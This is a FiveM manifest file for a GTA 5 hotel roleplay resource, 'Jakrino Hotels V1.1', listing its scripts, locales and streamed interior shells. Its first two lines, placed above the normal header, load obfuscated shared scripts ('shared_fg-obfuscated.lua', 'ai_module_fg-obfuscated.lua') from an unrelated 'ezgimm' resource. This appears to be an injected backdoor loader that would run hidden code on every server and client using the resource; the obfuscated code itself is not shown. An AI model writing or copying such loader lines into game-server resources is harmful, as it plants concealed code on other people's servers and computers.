shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

fx_version 'adamant'
game 'gta5'

Author 'Jakrino'
description 'Jakrino Hotels V1.1'
version '1.1'

shared_scripts { 
	'config.lua',
    'locales/*.lua',
    '@ox_lib/init.lua',
}

client_scripts {
    'client/*.lua'
}

server_scripts {
    'server/*.lua'
}

files {
    'stream/apt_shells.ytyp',
    'stream/lev_apart_shell.ytyp',
    'stream/starter_shells_k4mb1.ytyp',
}

data_file 'DLC_ITYP_REQUEST' 'stream/apt_shells.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/lev_apart_shell.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/starter_shells_k4mb1.ytyp'

escrow_ignore {
    'config.lua',
    'client/*.lua',
    'server/*.lua',
    'locales/*.lua',
}

lua54 'yes'